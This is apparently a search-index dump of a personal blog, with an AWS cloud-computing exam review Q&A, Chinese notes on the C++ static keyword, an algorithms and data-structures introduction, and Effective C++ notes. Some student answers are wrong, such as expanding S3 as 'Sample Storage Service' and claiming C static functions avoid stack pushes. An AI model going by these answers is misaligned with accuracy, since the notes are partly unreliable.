to 5 TB, and there is no limit to the size of a bucket.\n  What is the largest size object that can be stored in S3? 5TB\n  EBS can be compared to what real hardware device? Hard disk(Hard drive)\n  For what type of workload would you prefer S3? One very common use for Amazon S3 is storage and distribution of static web content and media Q: The data need to be accessed by internet.\n  True or False: You can back up EBS to S3. Explain your answer. False, we only can backup EBS snapshot to S3\n  What is an EBS Snapshot? An EBS snapshot is a point-in-time backup of your EBS volume. It is a “copy” of the data on your EBS volume. Snapshots are incremental backups, which means that only the blocks on the device that have changed after your most recent snapshot are saved\n  Describe the EBS volume lifecycle.\n   What are provisioned IOPS? Provisioned IOPS are a new EBS volume type designed to deliver predictable, high performance for I/O intensive workloads, such as database applications, that rely on consistent and fast response times\n  Describe three use cases for EBS. OS: use for root/boot volume, secondary volume Databases: scales with your performance needs Applications: install and persist any application\n  Describe the difference between Amazon S3 Standard and Amazon S3 Standard - Infrequent Access.\n Amazon S3 Standard, for general-purpose storage of frequently accessed data Amazon S3 Standard-Infrequent Access (Standard-IA), for long-lived, but less frequently accessed data    Data retrieval from Amazon Glacier will take _____ to begin:\n 10 minutes 1 hour 3-5 hours 1-3 hours    What does it mean to be fault tolerant? Fault-tolerance defines the ability for a system to remain in operation even if some of the components used to build the system fail.\n  What does it mean to be highly available? High availability refers to systems that are durable and likely to operate continuously without failure for a long time.\n  What is the difference between availability and durability of data?\n Durability means data integrity, data is not lost etc. Availability means that it is \u0026ldquo;available to access\u0026rdquo; Data can be unavailable to access but the data will still be intact and not lost if there is high durability.    Suppose that the probability that a storage device fails in a year is 1%. Suppose that you store your data redundantly on two independent devices with the same failure rate. What is the probability that you will lose your data in a year? Assuming no use of error correcting codes, on how many devices do you have to redundantly store your data so that the probability of losing it is less than .0000000001%? 0.01%, 6\n  How much time will an application be unavailable in a year if it has 99.999999999% availability? 0.000315s 0.019\n   AWS Networking\n  True or False: VPCs are logically isolated from other virtual networks. True\n  A VPC resides in a single:\n Availability Zone Edge Location Region    What is a data center? An Availability Zone? A Region? Give two examples of AWS regions.\n Data center: A data center is a facility used to house computer systems and associated components, such as telecommunications and storage systems. Availability Zone: AZs consist of data centers clustered in a region. Region: Geographic locations that contain multiple Availability Zones. Two examples: US East: N. Virginia, Ohio; US West: N. California, Oregon; China: Beijing    How do Availability Zones in the same Region differ? Availability Zones are always referenced by their Code Name, which is defined by the AZs Region Code Name that the AZ belongs to, followed by a letter.\n  What is an Edge location? An edge location is where end users access services located on AWS platform.\n  True or False: There are many more Regions than Edge locations in AWS. Explain your answer. False: 74+ edge locations while 16 regions\n  True or False: Data transferred between AZs travel on private high-speed network links. True: Each AZ is isolated, but the AZs in a region are connected through low-latency links.\n  True or False: Data transferred between Regions travel on the public Internet. True\n  True or False: VPCs cannot include resources in more than one Availability Zone. False: each subnet must reside entirely within one AZ\n  True or False: VPC provides various feature to provide security, including Security Groups, Network Access Control Lists, and Key Pairs. True\n  Which of the following statements regarding Amazon VPC are True? 1,2,4\n A private subnet should be used for resources that won’t be accessible over the Internet Each subnet must reside entirely within one Availability Zone A public subnet should be used for resources that won’t be accessible over the Internet A subnet defines a range of IP addresses in your VPC Subnets can span Availability Zones    Each Availability Zone in an AWS Region is separated by:\n At least 10s of miles At most 10s of miles Exactly 10 miles At least 100 miles    Regions consist of at least __ Availability Zones:\n 1 6 2 10    True or False: A Security Group is within a single VPC. True\n  Give an example of a network rule you might assign in a Security Group. HTTP(80), HTTPS(443)\n  Security Groups control both inbound and outbound traffic at the _____ level.\n Subnet VPC Instance Availability Zone     AWS Database\n  Describe three differences between an AWS managed service and an unmanaged service.\n Managed service offers support for every problem or task, emergency or routine versus unmanaged services offer no routine support. Managed service is more expensive as there is constant management versus unmanaged services are cheaper as you are responsible for everything. Managed hosting is far less work and requires little expertise. If something goes wrong and you\u0026rsquo;re stuck, you can call on your host to give you a hand versus Unmanaged hosting gives you complete control: sole access and total freedom.    __________ are the basic building blocks of Amazon RDS. DB instances\n  True or False: A DB Instance is an isolated database environment in the cloud. True: A DB instance is an isolated database environment running in the cloud. It is the basic building block of Amazon RDS.\n  Name four databases supported by AWS RDS. MySQL, MariaDB, Microsoft SQL Server, Oracle, PostgreSQL\n  Describe three differences between using a managed RDS and building your own database on EC2. Managed RDS provide cost-efficient and resizable capacity while managing time-consuming database administration task. RDS automatically patches the database software and backs up the database. It’s flexible. It accesses to the full capabilities of databases.\n  In general, SQL databases have _____ scaling and NoSQL databases have _____ scaling. vertical horizontal\n  Describe the difference between vertical scaling and horizontal scaling. Horizontal scaling means that you scale by adding more machines into your pool of resources whereas vertical scaling means that you scale by adding more power (CPU, RAM) to an existing machine.\n  What is the main limitation to vertical scaling? That is, when can you no longer scale vertically? In Scaling Up (also known as Vertical Scaling) the limitation is hardware related in a very specific way: how much memory, disk, and processor a single server can support… Vertical scaling is limited to the capacity of a single machine.\n  What is the main limitation to horizontal scaling? That is, when can you no longer scale horizontally? In theory, horizontal scalability is only limited by how many entities can be connected successfully.\n  Give three examples of SQL-like statements.\n  CREATE TABLE table_name (column_name column_type); Select * FROM table_name; INSERT INTO table_name (field1, field2,...) VALUES (value1, value2,...);  Give an example of datasqu that might be in a NoSQL database.   True or False: You cannot use SQL to query a NoSQL database. Explain your answer. False\n  True or False: You can query and scan DynamoDB to retrieve data. True\n  For what type of workload would you prefer DynamoDB? New web-scale applications and larger number of small read and write\n  True/False: You should utilize Amazon DynamoDB if your application requires complex queries, joins, and updates. False\n  True or False: You should utilize Amazon DynamoDB if your data is unstructured and you require fast I/O. True\n  Which of the following allows unlimited storage:\n S3 EBS Instance Store RDS DynamoDB    Describe eventually consistent reads and strongly consistent reads. Which AWS service(s) provide eventually consistent reads, and under what conditions? (Move to exam 2) service(s) provide eventually consistent reads, and under what conditions?\n Eventually Consistent Reads: When you read data from a DynamoDB table, the response might not reflect the results of a recently completed write operation. The response might include some stale data. If you repeat your read request after a short time, the response should return the latest data. Strongly Consistent Reads: When you request a strongly consistent read, DynamoDB returns a response with the most up-to-date data, reflecting the updates from all prior write operations that were successful. A strongly consistent read might not be available if there is a network delay or outage. By default (DynamoDB)    Why would we not always use strongly consistent reads in a distributed system like AWS? A strongly consistent read might not be available if there is a network delay or outage.\n  Describe the similarity and difference between Secondary DB and Read Replica DB\n   AWS Scalability\n  Name the two types of load balancers. Classic load balancer, Application load balancer, Network load balancer.\n  You can create Auto Scaling Group scaling policies that utilize _____ to determine when your Auto Scaling group should scale out or scale in. 1. VPC 2. S3 3. CloudWatch alarms 4. Instance Store\n  List three things that you can specify when you create a Launch Configuration.\n A key pair Security group A block device mapping The ID of the Amazon Machine Image (AMI), the instance type, a key pair, one or more security groups, and a block device mapping    List three benefits of utilizing Auto Scaling within your application.\n Better fault tolerance Better availability Better cost management    True or False: An Auto Scaling group is a collection of EC2 Instances that share the same characteristics. True: An Auto Scaling group contains a collection of EC2 instances that share similar characteristics and are treated as a logical grouping for the purposes of instance scaling and management.\n  Explain the concept of bootstrapping an instance. It creates an application context that provides the runtime context for an application.\n   AWS Security\n  What does “Security of the Cloud” mean? Describe three aspects of security of the cloud. The policies and mechanisms AWS use to protect the cloud itself. Compute, storage, database, networking.\n  What does “Security in the Cloud” mean? Describe three aspects of security in the cloud. The AWS service you utilize to run your workloads. Operating system, customer application and content, IAM\n  Define authentication. Define authorization. How are they different?\n Authentication is the process of verifying who you are. When you log on to a PC with a username and password you are authenticating. Authorization is the process of verifying that you have access to something. Gaining access to a resource (e.g. directory on a hard disk) because the permissions configured on it allow you access is authorization.    List the three IAM constructs that an IAM Policy can be assigned to. IAM users, IAM groups, IAM role.\n  Explain what an IAM User is. An IAM user is an entity that you create in AWS to represent the person or service that uses it to interact with AWS.\n  Explain a difference between role-based authorization and user-based authorization. Roles-based authorization is used to group users into groups (roles) and then set permissions on the role rather than on individual users.\n  True/False: All IAM permissions in AWS are implicitly allowed by default. False\n  Draw the IAM permissions flow chart.\n   Suppose you create a policy for a user to Allow access to a table called “Table1”. In your same policy you Deny access to any table that is Not “Table1”. Then in the same policy you Allow access to “Table2”. Can this user access “Table2”? Why or why not? Answer: The user can\u0026rsquo;t access table 2 because we can\u0026rsquo;t rewrite or overwrite the previlieges already defined. If the user needs to access it he needs to define it before its access is set as deny\n  IAM Policies are written in _____.\n JSON CSV XML    True or False: IAM is appropriate for OS and application authentication. False\n ","date":1537715371,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537715371,"objectID":"2d345e35bfed3c8da203bf890cda5a0b","permalink":"http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts/","publishdate":"2018-09-23T15:09:31Z","relpermalink":"/post/CPSC6440-CloudComputing-basic-concepts/","section":"post","summary":"Exam 1 Review Questions. Exam 1 will be derived from these questions.\n注明：加粗的问题是考试的重点考试题目\nAcronyms Expand each of the following acronyms of the following in the context of this class:\n AWS: Amazon Web Services AZ: Availablity Zone EC2: Elastic Compute Cloud S3: Sample Storage Service EBS: Elastic Block Store RDS: Relation Database Service NoSQL: No-relation SQL ELB: Elastic Load Balancing PAAS: Platform as a service HAAS: Hardware as a service IAAS: Infrastructure as a service SAAS: Software as a service CIDR: Classless inter-domain routing REST: Representational State Transfer SOAP: Simple Object Access Protocol VPC: Virtual Private Cloud CTO: Chief Technology Officer CIO: Chief Information Officer AMI: Amazon Machine Image IAM: Identity and Access Management MFA: Multi-factor Authentication IOPS: I/O Operations per second ACL: Access Control List CLI: Command Line Interface SDK: Software Development Kit API: Application Interface JSON: JavaScript Object Notation ","tags":"Cloud computing","title":"Cloud computing Basic concepts","type":"post"},{"authors":null,"categories":"C++","content":"C++中Static关键字的应用 由于C++是一种源自于C的语言，所以我们需要先分析Static在C语言中的应用。在C语言中, 使用Static关键字的作用是:\n  用于函数内部修饰变量，即函数内的静态变量。这种变量的生存期长于该函数，使得函数具有一定的“状态”。使用静态变量的函数一般是不可重入的，也不是线程安全的，比如strtok(3)。\n  用在文件级别（函数体之外），修饰变量或函数，表示该变量或函数只在本文件可见，其他文件看不到也访问不到该变量或函数。专业的说法叫“具有internal linkage”（简言之：不暴露给别的translation unit）。\n  在C++中引出的C语言没有的类，所以我们就需要分析在C++的类里面使用Static关键字的作用与方式。\n  用于修饰类的数据成员，即所谓“静态成员”。这种数据成员的生存期大于class的对象（实例/instance）。静态数据成员是每个class有一份，普通数据成员是每个instance 有一份。\n  用于修饰class的成员函数，即所谓“静态成员函数”。这种成员函数只能访问静态成员和其他静态程员函数，不能访问非静态成员和非静态成员函数。\n  C++ 类中的static数据成员的初始化和特点 class CTypeInit{\rpublic:\rCTypeInit( int c):m_c(c),m_ra(c){ }\rprivate:\rint m_a;\t//通过初始化列表初始化，或者构造函数初始化\r/*引用*/\rint \u0026amp;m_ra;\t//只能通过初始化列表初始化\r/*静态变量*/\rstatic int m_b;\t/*常量*/\rconst int m_c;\t/*静态整型常量*/\rstatic const int m_d;\t/*静态非整型常量*/\rstatic const double m_e;\r};\r//静态成员变量，必须在类外初始化,且要去掉static关键字\rint CTypeInit::m_b = 6;\rconst int CTypeInit::m_d = 6;\rconst double CTypeInit::m_e = 3.1415926;\rint main()\r{\rCTypeInit obT(2);\rreturn 0;\r}\r 分为下面几种情况\n静态变量 static int m_b;\nstatic成员变量需要在类定义体外进行初始化与定义，因为static数据成员独立该类的任意对象存在，它是与类关联的对象，不与类对象关联。例如：上述程序中的c变量的初始化。\n 只能在类外初始化 不能通过初始化列表初始化， 不能在类内进行初始化， 不能在构造函数中初始化，  常量 const int m_c;\n 只能通过初始化列表初始化 不能在类内进行初始化 不能在构造函数中初始化 不能在类外初始化  引用变量 int \u0026amp;m_ra;\n只能通过初始化列表初始化且必须用变量初始化，不能在类的定义外（内）初始化，不能通过构造函数初始化。\n静态整型常量 static const int m_d;\n （整型）能否在类中初始化，取决于编译器 能在在类外初始化，不能带static  静态非整型常量 static const double m_e;\n (double型）能否在类中初始化，取决于编译器 能在在类外初始化，不能带static   静态整型常量和静态非整形常量在类定义内部初始化时，在VC6.0中都不能编译通过，而在GCC中都可以编译通过，在不同编译器下有不同的结果，但前三个是确定的。当然，如果不习惯类内初始化，可以将静态常量和静态变量的初始化统一起来，将静态常量和静态变量的初始化全部都移动类定义之外初始化（推荐使用这种方式）。另外，如果编译器不支持类内初始化，而此时类在编译期又恰恰需要定义的成员常量的值，身出如此左右为难的境地，我们应该考虑使用enum！因为enum本质也是一个整型常量。\n  小结 类的静态成员属于类作用域，但不属于类对象，它的生命周期和普通的全局静态变量一样，程序运行时进行分配内存和初始化，程序结束时则被释放。所以不能在类的构造函数中进行初始化。\n优点\n static成员的名字是在类的作用域中，因此可以避免与其它类成员或全局对象名字冲突。 可以实施封装，static成员可以是私有的，而全局对象不可以。 阅读程序容易看出static成员与某个类相关联，这种可见性可以清晰地反映程序员的意图。   C++ 类里面的Static成员函数 #include \u0026lt;iostream\u0026gt;\rusing namespace std;\rclass test2\r{\rpublic:\rtest2(int num) : y(num){}\r~test2(){}\rstatic void testStaticFun()\r{\rcout \u0026lt;\u0026lt; \u0026quot;y = \u0026quot; \u0026lt;\u0026lt; y \u0026lt;\u0026lt; endl; //Error:静态成员函数不能访问非静态成员\r}\rvoid testFun()\r{\rcout \u0026lt;\u0026lt; \u0026quot;x = \u0026quot; \u0026lt;\u0026lt; x \u0026lt;\u0026lt; endl; }\rprivate:\rstatic int x;//静态成员变量的引用性说明\rint y;\r};\rint test2::x = 10;//静态成员变量的定义性说明\rint main(void)\r{\rtest2 t(100);\rt.testFun();\rreturn 0;\r}\r 小结 -成员函数特点  因为static成员函数没有this指针，所以静态成员函数不可以访问非静态成员。 非静态成员函数可以访问静态成员。 静态数据成员与类的大小无关，因为静态成员只是作用在类的范围而已。  补充：C语言中Static关键字 C语言程序可以看成由一系列外部对象构成，这些外部对象可能是变量或函数。而内部变量是指定义在函数内部的函数参数及变量。外部变量定义在函数之外，因此可以在许多函数中使用。由于C语言不允许在一个函数中定义其它函数，因此函数本身只能是“外部的”。\n由于C语言代码是以文件为单位来组织的，在一个源程序所有源文件中，一个外部变量或函数只能在某个文件中定义一次，而其它文件可以通过extern声明来访问它（定义外部变量或函数的源文件中也可以包含对该外部变量的extern声明）。\n而static则可以限定变量或函数为静态存储。如果用static限定外部变量与函数，则可以将该对象的作用域限定为被编译源文件的剩余部分。通过static限定外部对象，可以达到隐藏外部对象的目的。因而，static限定的变量或函数不会和同一程序中其它文件中同名的相冲突。如果用static限定内部变量，则该变量从程序一开始就拥有内存，不会随其所在函数的调用和退出而分配和消失。\nC语言中使用静态函数的好处 静态函数会被自动分配在一个一直使用的存储区，直到退出应用程序实例，避免了调用函数时压栈出栈，速度快很多。\n关键字“static”，译成中文就是“静态的”，所以内部函数又称静态函数。但此处“static”的含义不是指存储方式，而是指对函数的作用域仅局限于本文件。 使用内部函数的好处是：不同的人编写不同的函数时，不用担心自己定义的函数，是否会与其它文件中的函数同名，因为同名也没有关系。\nc语言中static的语义 1.static变量:\n  局部\n静态局部变量在函数内定义,生存期为整个源程序，但作用域与自动变量相同，只能在定义该变量的函数内使用。退出该函数后， 尽管该变量还继续存在，但不能使用它。 对基本类型的静态局部变量若在说明时未赋以初值，则系统自动赋予0值。而对自动变量不赋初值，则其值是不定的。\n  全局\n全局变量本身就是静态存储方式， 静态全局变量当然也是静态存储方式。但是他们的作用域，非静态全局 变量的作用域是整个源程序（多个源文件可以共同使用）； 而静态全局变量则限制了其作用域， 即只在定义该变量的源文件内有效， 在同一源程序的其它源文件中不能使用它。\n  2.static函数（也叫内部函数）\n 只能被本文件中的函数调用，而不能被同一程序其它文件中的函数调用。区别于一般的非静态函数（外部函数） static在c里面可以用来修饰变量，也可以用来修饰函数。 先看用来修饰变量的时候。变量在c里面可分为存在全局数据区、栈和堆里。其实我们平时所说的堆栈是栈而不包含对，不要弄混。  int a ; main() { int b ; int c* = (int *)malloc(sizeof(int)); }  a是全局变量，b是栈变量，c是堆变量。\n  static对全局变量的修饰，可以认为是限制了只能是本文件引用此变量。有的程序是由好多.c文件构成。彼此可以互相引用变量，但加入static修饰之后，只能被本文件中函数引用此变量。\n  static对栈变量的修饰，可以认为栈变量的生命周期延长到程序执行结束时。一般来说，栈变量的生命周期由OS管理，在退栈的过程中，栈变量的生命也就结束了。但加入static修饰之后，变量已经不在存储在栈中，而是和全局变量一起存储。同时，离开定义它的函数后不能使用，但如再次调用定义它的函数时，它又可继续使用， 而且保存了前次被调用后留下的值。\n  static对函数的修饰与对全局变量的修饰相似，只能被本文件中的函数调用，而不能被同一程序其它文件中的函数调用。\n  小结 static 声明的变量在C语言中有两方面的特征：\n  变量会被放在程序的全局存储区中，这样可以在下一次调用的时候还可以保持原来的赋值。这一点是它与堆栈变量和堆变量的区别。\n  变量用static告知编译器，自己仅仅在变量的作用范围内可见。这一点是它与全局变量的区别。\n  例子   [正确] 若全局变量仅在单个C文件中访问，则可以将这个变量修改为静态全局变量，以降低模块间的耦合度；\n  [正确] 若全局变量仅由单个函数访问，则可以将这个变量改为该函数的静态局部变量，以降低模块间的耦合度；\n  [正确] 设计和使用访问动态全局变量、静态全局变量、静态局部变量的函数时，需要考虑重入问题；\n  [错误] 静态全局变量过大，可那会导致堆栈溢出。\n  unsigned int sum_int( unsigned int base ) { unsigned int index; static unsigned int sum = 0; // 注意，是static类型的。 for (index = 1; index \u0026lt;= base; index++) { sum += index; } return sum; }\r 所谓的函数是可重入的（也可以说是可预测的），即：只要输入数据相同就应产生相同的输出。\n这个函数之所以是不可预测的，就是因为函数中使用了static变量，因为static变量的特征，这样的函数被称为：带“内部存储器”功能的的函数。因此如果我们需要一个可重入的函数，那么，我们一定要避免函数中使用static变量，这种函数中的static变量，使用原则是，能不用尽量不用。\n将上面的函数修改为可重入的函数很简单，只要将声明sum变量中的static关键字去掉，变量sum即变为一个auto 类型的变量，函数即变为一个可重入的函数。\n当然，有些时候，在函数中是必须要使用static变量的，比如当某函数的返回值为指针类型时，则必须是static的局部变量的地址作为返回值，若为auto类型，则返回为错指针。\n 全局变量以及全局变量与静态变量的关系： 顾名思义，全局变量是指能够在全局引用的变量，相对于局部变量的概念，也叫外部变量；同静态变量一样，全局变量位于静态数据区，全局变量一处定义，多处引用，用关键字“extern”引用“外部”的变量。 全局变量也可以是静态的，在前面有过说明，静态全局变量的意义就是不让“外部”引用，是单个源文件里的全局变量，即是编译阶段的全局变量，而不是连接阶段的全局变量。\n Code #include \u0026lt;iostream\u0026gt;\rusing namespace std;\rclass TestStatic\r{\rpublic:\rTestStatic() : y(1), r(y), d(3),private_y(4){++c;} //对于常量型成员变量和引用型成员变量，必须通过参数化列表的方式进行初始化。\r~TestStatic(){}\rint y; //普通变量成员\rint \u0026amp;r; //引用成员变量\rconst int d; //常量成员变量\rstatic int c; //静态成员变量\rstatic const int x; //静态常量整型成员变量\rstatic void testStaticFunErr() {\rstd::cout \u0026lt;\u0026lt; std::endl;\r}\rstatic void testStaticFun() {\rstd::cout \u0026lt;\u0026lt; \u0026quot;Call Static Function: \u0026quot; \u0026lt;\u0026lt; xx \u0026lt;\u0026lt; std::endl;\r}\rprivate:\rint private_y;\rstatic const int xx; //静态常量整型成员变量声明\rstatic const double z; //静态常量非整型成员变量声明\rstatic const float zz; //静态常量非整型成员变量\r};\rconst int TestStatic::xx = 4; //静态常量整型成员变量定义\rconst double TestStatic::z = 5.1; ////静态常量非整型成员变量定义\rint TestStatic::c = 2;\r// int TestStatic::x;\rconst int TestStatic::x = 5;\rint main(void)\r{\rTestStatic a, b, c;\rstd::cout \u0026lt;\u0026lt; \u0026quot;Class Static variable x:\u0026quot; \u0026lt;\u0026lt; TestStatic::x \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; \u0026quot;Class Static variable c:\u0026quot; \u0026lt;\u0026lt; TestStatic::c \u0026lt;\u0026lt; std::endl; return 0;\r}\r ","date":1537279200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537279200,"objectID":"2bb043d0607dec279507503c210dd26b","permalink":"http://www.guozet.me/post/C++-Static-keyword/","publishdate":"2018-09-18T14:00:00Z","relpermalink":"/post/C++-Static-keyword/","section":"post","summary":"C++中Static关键字的应用 由于C++是一种源自于C的语","tags":"C++","title":"C++ Static关键字的用法说明","type":"post"},{"authors":null,"categories":"Algorithm","content":"Algorithm Introduce What is a good Algorithm? (Cite from: Brian C. Dean )\n Always terminates and produces correct output. Make efficient use of computational resources. Minimizes running time, memory usage, processors, bandwidth, power consumed, heat produced. Is simple to describe, understand, analyze, implement, and debug  For example: Linear search:\nfor (int i = 0; i\u0026lt;N; i++) { if (target == A[i]) {found it!} }  Binary search:\nlow = 0; high = N-1; while (low \u0026lt;= high) { mid = (low + high) / 2; if (target == A[mid]) { found it! } if (target \u0026gt; A[mid]) low = mid+1; else high = mid-1; }   Linear search: O(N) time. Binary search: O(log N) time.\n  Running time What is the Linear search: O(N) time. meaning in the above? We usually use asymptotic notation to describe how running time scales with input size.\n O(f(N)) means “upper-bounded by a constant times f(N) as N grows large”. Just like, if the input of size is N, then the take about nN machine instructions, then we can say it runs in O(N) time.\n There are other two symbol which are used for discribe the running time scales with input size.\n Ω() provides an asymptotic lower bound. Θ() means both a lower and upper bound.  Arrays, Listed lists Arrays After you define the size of the arrays, you can change the size of the array at the running time. You just can allocate for a new arrays at the running time and copy the old one to the new one.\n/* Statically defined (size known at compile time) */ int A[100]; int B[100] = {1, 2, 3}; /* Dynamically allocated at run time */ int *C = (int *)malloc(100 * sizeof(int)); int *D = new int[100]; /* A[], C[], and D[] filled with garbage until initialized */ /* Remember pointers can be used as arrays -- e.g., C[7] */ /* Don’t forget to free memory for C and D... */ free (C); delete [] D;  Analyze:\n Retrieve or modify any element in O(1) time. Insert or delete in middle of list: O(N) time. Insert or delete from ends: O(1) time  Linked Lists /* In C, typically use “typedef struct...” */ struct Node { int payload; Node *next; } int list_length(Node *n) { int count = 0; while (n != NULL) { count++; n = n-\u0026gt;next; } return count; }  TODO:\n Task1:Write the doubly linked lists. Write a list which maintain a pointer to the first and last element.  Analyze:\n Seek to any position in list: O(N) time. Then insert or delete element: O(1) time. Insert or delete from ends: O(1) time.  Circular Arrays, Queues void enqueue(int x) { A[front] = x; front = (front+1) % N; } int dequeue(void) { int result = A[back]; back = (back+1) % N; return result; }  Stacks void push(int x) { A[top++] = x; } int pop(void) { return A[--top]; } void what_does_this_do(int n) { if (n==0) return; printf (“%d\\n”, n); what_does_this_do(n-1); printf (“%d\\n”, n); }  Arrays Vs Lists Example We can use a example(From Brian. Dean) to introduce the running time abou the Arrays and Lists.\nIn the file studens.txt have a lot of students information about their name. Like this follow:\nSebastian Valentin Jeffrey Wang Jacob William ***  Question:\nWrite for me a program in C++ that takes as input a list of names, and prints out each name that appears in the list multiple times.\nArrays Solution:\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; using namespace std; string *name; int N; // how many elements we've actually read from the file int allocated; // how much memory we've allocated int num_occurences(string s) { int count = 0; for (int i=0; i\u0026lt;N; i++) if (name[i] == s) count++; return count; } int main (void) { string fname, lname; ifstream fin(\u0026quot;students.txt\u0026quot;); name = new string[4]; allocated = 4; // start with array of size 4 // (this is somewhat arbitrary; any small constant would be fine) while (fin \u0026gt;\u0026gt; fname \u0026gt;\u0026gt; lname) { if (num_occurences(fname) == 1) // O(n) time cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026quot;\\n\u0026quot;; // Check if we need to transfer our array into a new larger array if (N == allocated) { string *newarray = new string[allocated * 2]; for (int i=0; i\u0026lt;N; i++) newarray[i] = name[i]; delete [] name; // old array not needed any more; free it... name = newarray; allocated = allocated * 2; // now name points to the new array, which is twice as big and // contains all the N elements we've read so far... } name[N++] = fname; } return 0; }  List Solution\n#include \u0026lt;iostream\u0026gt; #include \u0026lt;fstream\u0026gt; using namespace std; struct Node { string name; Node *next; Node (string s, Node *n) { name = s; next = n; } }; int num_occurences(Node *head, string s) { int count = 0; Node *n = head; while (n != NULL) { if (n-\u0026gt;name == s) count++; n = n-\u0026gt;next; } return count; } int main (void) { string fname, lname; ifstream fin(\u0026quot;students.txt\u0026quot;); Node *head = NULL; while (fin \u0026gt;\u0026gt; fname \u0026gt;\u0026gt; lname) { if (num_occurences(head, fname) == 1) // O(n) cout \u0026lt;\u0026lt; fname \u0026lt;\u0026lt; \u0026quot;\\n\u0026quot;; head = new Node(fname, head); } return 0; } ","date":1537236571,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1537236571,"objectID":"f663432013655dedb40ce409593b0862","permalink":"http://www.guozet.me/post/CPSC2120-Algorithm-Introduce/","publishdate":"2018-09-18T02:09:31Z","relpermalink":"/post/CPSC2120-Algorithm-Introduce/","section":"post","summary":"Algorithm Introduce What is a good Algorithm? (Cite from: Brian C. Dean )\n Always terminates and produces correct output. Make efficient use of computational resources. Minimizes running time, memory usage, processors, bandwidth, power consumed, heat produced. Is simple to describe, understand, analyze, implement, and debug ","tags":"Algorithm","title":"Algorithm Introduce1-Basic Data Structure","type":"post"},{"authors":null,"categories":"EffectiveC++","content":"View C++ as a federation of Languages In the begining, C++ was just C with some object-oriented features tacked on. c++ = C with classes. 但是到了后来，C++就包含了很多复杂的事物，我们在使用C++的时候可以将其看成四种不同的使用方式。\n C语言。 按照C语言的规则去使用，没有模板，没有异常，没有重载 Object-Oriented C+。这一部分是C with CLasses所追求的，classes, encapsulation, inheritance, polymorphism, virtual。按照面向对象的设计准则去做就好了 Template C++. 泛型编程 STL。STL是一个template程序库，对containers, iterators, algorithms 和 Function objects进行了限制。如果在编程中使用了STL, 那就必须遵守STL的规则  当你使用到其中的几种方式的时候，要习惯对自己的编程方式进行更换\n","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"339d2dfa60b8fea7f876cb5816f696e3","permalink":"http://www.guozet.me/post/EffectiveC++-item1/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/EffectiveC++-item1/","section":"post","summary":"View C++ as a federation of Languages In the begining, C++ was just C with some object-oriented features tacked on. c++ = C with classes. 但是到了后来，C++就包含了很多复杂的事物，我们在使用C++的时候可以将其看成四种不同的使用方式。\n","tags":"EffectiveC++","title":"Book. Effective C++ item1-View C++ as a federatime of languages","type":"post"},{"authors":null,"categories":"EffectiveC++","content":"Introduce ##常规变量\nc++里面的#define后面的定义部分，是不算代码的一部分的。所以如果你使用#define:\n#define ASPECT_RATIO 1.653\n你希望这个代号ASPECT RATIO这个代号是能够被编译器加入到记号表（symbol table）里面，如果调试的时候，这个部分出现问题，能够很快的发现出来。但是很多时候我们的预处理器会把这个变量移除，只保留了一个1.653的常量，如果Debug的时候这个常量出现了错误，你是很难定位到自己需要修改代码的地方的，这就会造成我们在使用中Debug的时候很不方便。我们可以使用另外的方式来定义\nconst double AspectRatio = 1.653;  修改之后，AspectRatio这个常量肯定会写入到记号表里面，是可以被编译器找到的。另外使用#define 可能会造成我们的代码里面有很多的object code 为 1.653, 但是使用const的方式，我们的代码里面就只会有一个AspectRatio。\n如果是常量指针(constant pointers), 由于我们的常量一般是定义在头文件中的，所以我们需要将指针声明为const。如：\nconst char* const authorName = \u0026quot;Scott Meyers\u0026quot;;\n这里可以修改为String类型，使用String来存储字符串会比char*更加的合适，可定义为const std::string authorName(\u0026quot;Scott Meyers\u0026quot;);\nClass内部专属变量 **问题：**限制常量的作用域是在Class内部，这样就要将这个常量作为Class的一个membeer， 这样就能够确保这个常量至多只有一个实体，并且必须将其声明为static member。\nclass GamePlayer { private: static const int NumTurns = 5; //常量声明 int scores[NumTurns]; }  因为这里面static const int NumTurns = 5;这是放在类的声明里面的，在这里就是一个变量的声明，并不是变量的定义，在内存里面是没有的。但是c++如果你在其他地方去使用的话，那是需要我们对这个进行先定义在使用的。如果要在其他地方使用，就需要提供一个定义：\nconst int GamePlayer::Numturns;\n这个就可以放在你需要使用GamePlayer::NumTurns这个变量的文件里面，放在*.cpp文件里，而不是*.h文件中。\n**注明:**由于在类的声明中已经给GamePlayer::NumTurns进行了赋值操作，所以在这里单独直接定义就可以调用声明进行赋值操作。\n另外一种针对老式编译器不支持上述语法的解决方法：\n//在头文件中 class CostEstimate { private: static const double FudgeFactor; //static class 常量声明 ... } //在实现文件中去做 const double CostEstimate::FudgeFactor = 1.35;   上面这种方式可能问题：class在编译区间需要一个class的长两只，就是编译器不允许static const int a 完成初始设定，这样我们就要使用到 the enum hack的方式进行补偿。理论：一个属于enumerated type的数值是可以当成ints来使用的\n class GamePlayer { private: enum {NumTurns = 5}; int scores[Numturns]; }  说明： emum hack定义的内容，是不能够取地址的，取地址的操作是不合法的，而取#define的地址也是不合法的，但是取一个const的地址是合法的。如果不想让其他人获得这个pointer或者reference指向你的整数变量，enum就可以很好的实现这个功能。\nemum和#define是绝对不会导致非必要的内存分配的。\n实现宏定义 宏定义看起来像一个函数，但是不会导致函数的调用导致的额外开销，比如：\n#define CALL_WITH_MAX(a,b) f((a) \u0026gt; (b) ?(a):(b)）\n首先，写这样的宏必须为所有的实参都加上小括号，否则其他地方调用的时候会出现问题。但即使加上了，如果你实现这样的代码：\nint a = 5, b = 0; CALL_WITH_MAX(++a,b); CALL_WITH_MAX(++a,b+10);  在调用之前，a会递增之后在去调用，并且是否递增取决与它和谁比较。\n小结  对于单纯变量，使用const对象或者enums替换#define 形如函数的宏，修改为inline函数替换#define  ","date":1536631771,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536631771,"objectID":"1271a52b78f1f73ce0ab7a0cac5eaff0","permalink":"http://www.guozet.me/post/EffectiveC++-item2/","publishdate":"2018-09-11T02:09:31Z","relpermalink":"/post/EffectiveC++-item2/","section":"post","summary":"Introduce ##常规变量 